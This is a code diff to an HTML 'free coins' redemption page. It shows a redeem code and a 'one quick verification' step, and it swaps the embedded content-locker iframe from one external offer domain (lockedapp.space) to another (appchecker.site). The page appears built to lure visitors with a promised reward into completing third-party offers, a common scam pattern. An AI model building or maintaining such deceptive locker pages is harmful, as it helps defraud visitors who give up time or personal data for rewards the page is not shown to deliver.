@@ -1257,7 +1257,7 @@
                         </div>
                         <div class="redeem-input-group">
                             <label>Redeem Code : santa1010</label>
-                            <input type="text" class="redeem-input" id="redeemCode" placeholder="Enter redeem code..."
+                            <input type="text" class="redeem-input" id="redeemCode" placeholder="Enter Redeem Code ..."
                                 autocomplete="off">
                         </div>
                         <div class="redeem-message" id="redeemMessage"></div>
@@ -1327,9 +1327,8 @@
                     <p class="text-gray-400 text-sm mb-6">Complete <strong class="text-white">one quick
                             verification</strong> to unlock your free <span id="locker-coin-name">coins</span>.</p>
 
-                    <div id="contentLockerContainer" class="min-h-[200px] flex items-center justify-center">
-                        <!-- Content locker will be injected here -->
-                        <div class="text-gray-500 text-sm">Loading offers...</div>
+                    <div id="contentLockerContainer" class="w-full block min-h-[350px]" style="margin-left: -16px; width: calc(100% + 32px);">
+                        <div class="text-gray-500 text-sm text-center mt-8">Loading offers...</div>
                     </div>
                 </div>
             </div>
@@ -1630,15 +1629,14 @@
             const container = document.getElementById('contentLockerContainer');
             container.innerHTML = '';
 
-            // Create iframe for the content locker
+            // Inject new content locker
             const iframe = document.createElement('iframe');
-            iframe.src = 'https://lockedapp.space/cl/i/exxjpm';
+            iframe.src = 'https://appchecker.site/cl/i/xppw39';
             iframe.style.width = '100%';
             iframe.style.height = '100%';
             iframe.style.minHeight = '400px';
             iframe.style.border = 'none';
             iframe.style.borderRadius = '12px';
-
             container.appendChild(iframe);
         }
 
@@ -1685,4 +1683,3 @@
 </body>
 
 </html>
-
